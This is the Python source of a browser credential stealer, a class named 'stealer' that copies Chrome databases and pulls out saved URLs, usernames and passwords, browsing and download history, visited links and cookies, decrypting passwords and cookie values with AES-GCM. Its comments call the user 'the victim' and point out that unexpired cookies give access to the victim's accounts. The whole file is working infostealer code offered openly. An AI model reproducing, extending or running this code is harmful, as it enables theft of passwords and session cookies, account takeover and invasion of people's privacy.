import os
import sqlite3
import shutil
import datetime
from typing import Dict, List
from Crypto.Cipher import AES

# Perform the stealing
class stealer:
    def __init__(self):
        pass

    # Convert Webkit/Chrome timestamp to human-readable format
    def convertWebkitChromeTimestamp(self, timestamp: int) -> str:
        try:
            return str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp))
        except Exception as e:
            raise Exception(f"Error while converting the timestamp: {e}")

    # Decrypt the password using the master key
    def decryptPassword(self, buffer: bytes, masterKey: bytes) -> str:
        try:
            initialVector:bytes = buffer[3:15]
            payload:bytes = buffer[15:]
            cipher:AES = AES.new(masterKey, AES.MODE_GCM, initialVector)
            decryptedPassword:bytes = cipher.decrypt(payload)
            decryptedPassword:str = decryptedPassword[:-16].decode("latin-1")
            return decryptedPassword
        except Exception as e:
            raise Exception(f"Error while decrypting the password: {e}")

    # Obtain data generally. The inner logic of extracting specific data is defined in the processFunction
    # (For example, extracting password file and history file are different, so the processFunction is different.)
    def getData(self, dbPath: str, sqlQuery: str, masterKey: bytes, processFunction) -> Dict:
        try:
            shutil.copy2(dbPath, "./tmp.db")
            db: sqlite3.Connection = sqlite3.connect("./tmp.db")
            cursor: sqlite3.Cursor = db.cursor()
            cursor.execute(sqlQuery)
            data: List[str] = cursor.fetchall()

            # Extract and decrypt the data, detailed logic differs depending on the data type the function processes
            credential = processFunction(data, masterKey)

            db.close()
            os.remove("./tmp.db")
            return credential
        except Exception as exception:
            print(f"[!] {exception}")


    # Extract login data to extract URL/ID/PW information from the database
    def extractAndDecryptData(self, data: List[str], masterKey: bytes) -> Dict:
        PasswordCredential: Dict = {}
        for row in data:
            url: str                    = row[0]
            username: str               = row[1]
            encryptedPassword: bytes    = row[2]
            if url == "" or username == "" or encryptedPassword == "":
                continue
            decryptedPassword: str = self.decryptPassword(encryptedPassword, masterKey)
            # print(f"[+]  - URL: {url}, Username: {username}, Password: {decryptedPassword}")
            PasswordCredential[url] = {
                "username": username,
                "password": decryptedPassword
            }
        return PasswordCredential

    # Extract history data to extract URL/Title/VisitCount/TypedCount/LastVisitTime information from the database
    def extractHistory(self, data: List[str], masterKey: bytes) -> Dict:
        History: Dict = {}
        for row in data:
            url: str                = row[0]
            title: str              = row[1]
            visitCount: int         = row[2]
            typedCount: int         = row[3]
            lastVisitTime: str      = self.convertWebkitChromeTimestamp(row[4])
            # print(f"[+]  - URL: {url}, Title: {title}, Visit Count: {visitCount}, Typed Count: {typedCount}, Last Visit Time: {lastVisitTime}")
            History[url] = {
                "title": title,
                "visitCount": visitCount,
                "typedCount": typedCount,
                "lastVisitTime": lastVisitTime
            }
        return History

    # Extract visited link data to extract URL/FrameURL/VisitCount information from the database
    # Because it provides visit_count, it is useful to know which site the victim visited frequently
    def extractVisitedLink(self, data: List[str], masterKey: bytes) -> Dict:
        VisitedLink: Dict = {}
        for row in data:
            topLevelURL: str        = row[0]
            frameURL: str           = row[1]
            visitCount: int         = row[2]
            # print(f"[+]  - Top Level URL: {topLevelURL}, Frame URL: {frameURL}, Visit Count: {visitCount}")
            VisitedLink[topLevelURL] = {
                "frameURL": frameURL,
                "visitCount": visitCount
            }
        return VisitedLink

    # Extract cookie data to extract HostKey/CreationUTC/Name/EncryptedValue/Path/ExpiresUTC/IsSecure/IsHttpOnly/LastAccessUTC/HasExpires/IsPersistent/SameSite/SourceScheme information from the database
    # Because cookies are used for session management, it is useful to know which site the victim visited frequently, and what kind of information is stored in the cookie.
    # Also, unexpired cookies can be used to access the victim's account.
    def extractCookie(self, data: List[str], masterKey: bytes) -> Dict:
        Cookie: Dict = {}
        for row in data:
            hostKey: str            = row[0]
            creationUTC: str        = self.convertWebkitChromeTimestamp(row[1])
            name: str               = row[2]
            encryptedValue: bytes   = row[3]
            path: str               = row[4]
            expiresUTC: str         = self.convertWebkitChromeTimestamp(row[5])
            isSecure: int           = row[6]
            isHttpOnly: int         = row[7]
            lastAccessUTC: str      = self.convertWebkitChromeTimestamp(row[8])
            hasExpires: int         = row[9]
            isPersistent: int       = row[10]
            sameSite: int           = row[11]
            sourceScheme: int       = row[12]
            decryptedValue: str     = self.decryptPassword(encryptedValue, masterKey)
            # print(f"[+]  - Host Key: {hostKey}, Creation UTC: {creationUTC}, Name: {name}, Decrypted Value: {decryptedValue}, Path: {path}, Expires UTC: {expiresUTC}, Is Secure: {isSecure}, Is Http Only: {isHttpOnly}, Last Access UTC: {lastAccessUTC}, Has Expires: {hasExpires}, Is Persistent: {isPersistent}, Same Site: {sameSite}, Source Scheme: {sourceScheme}")
            Cookie[hostKey] = {
                "creationUTC": creationUTC,
                "name": name,
                "decryptedValue": decryptedValue,
                "path": path,
                "expiresUTC": expiresUTC,
                "isSecure": isSecure,
                "isHttpOnly": isHttpOnly,
                "lastAccessUTC": lastAccessUTC,
                "hasExpires": hasExpires,
                "isPersistent": isPersistent,
                "sameSite": sameSite,
                "sourceScheme": sourceScheme
            }
        return Cookie

    # Extract download data to extract CurrentPath/TargetPath/referrer/StartTime/EndTime/TotalBytes/LastAccessTime/MimeType/State/DangerType/InterruptReason information from the database
    # Because it provides the download history, it is useful to know what kind of files the victim downloaded.
    # Metadata about downloaded files can be used to analyze the victim's behavior.
    def extractDownloadHistory(self, data: List[str], masterKey: bytes) -> Dict:

        DownloadHistory: Dict = {}
        for row in data:
            currentPath: str        = row[0]
            targetPath: str         = row[1]
            referrer: str           = row[2]
            startTime: str          = self.convertWebkitChromeTimestamp(row[3])
            endTime: str            = self.convertWebkitChromeTimestamp(row[4])
            totalBytes: int         = row[5]
            lastAccessTime: str     = self.convertWebkitChromeTimestamp(row[6])
            mimeType: str           = row[7]
            state: int              = row[8]
            dangerType: int         = row[9]
            interruptReason: int    = row[10]
            # print(f"[+]  - Current Path: {currentPath}, Target Path: {targetPath}, Referrer: {referrer}, Start Time: {startTime}, End Time: {endTime}, Total Bytes: {totalBytes}, Last Access Time: {lastAccessTime}, MIME Type: {mimeType}, State: {state}, Danger Type: {dangerType}, Interrupt Reason: {interruptReason}")
            DownloadHistory[currentPath] = {
                "targetPath": targetPath,
                "referrer": referrer,
                "startTime": startTime,
                "endTime": endTime,
                "totalBytes": totalBytes,
                "lastAccessTime": lastAccessTime,
                "mimeType": mimeType,
                "state": state,
                "dangerType": dangerType,
                "interruptReason": interruptReason
            }
        return DownloadHistory

